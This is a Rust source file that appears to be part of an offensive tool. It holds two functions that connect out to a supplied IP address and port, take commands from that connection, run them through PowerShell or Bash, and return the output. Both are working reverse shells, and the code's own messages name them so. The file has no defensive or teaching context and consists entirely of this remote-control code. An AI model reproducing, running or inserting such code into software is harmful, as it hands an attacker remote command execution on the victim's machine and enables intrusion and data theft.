mod executor;

use std::net::TcpStream;
use std::io::{Read, Write};

pub fn run_powershell_shell(ip: &str, port: &str) {
    println!("Launching PowerShell reverse shell to {}:{}", ip, port);

    if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", ip, port)) {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) if size > 0 => {
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = executor::execute_powershell_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }
                _ => break,
            }
        }
    } else {
        eprintln!("Failed to connect to {}:{}", ip, port);
    }
}

pub fn run_bash_shell(ip: &str, port: &str) {
    println!("Launching Bash reverse shell to {}:{}", ip, port);

    if let Ok(mut stream) = TcpStream::connect(format!("{}:{}", ip, port)) {
        loop {
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) if size > 0 => {
                    let command = String::from_utf8_lossy(&buffer[..size]);
                    let output = executor::execute_bash_command(command.trim());
                    let _ = stream.write(output.as_bytes());
                }
                _ => break,
            }
        }
    } else {
        eprintln!("Failed to connect to {}:{}", ip, port);
    }
}
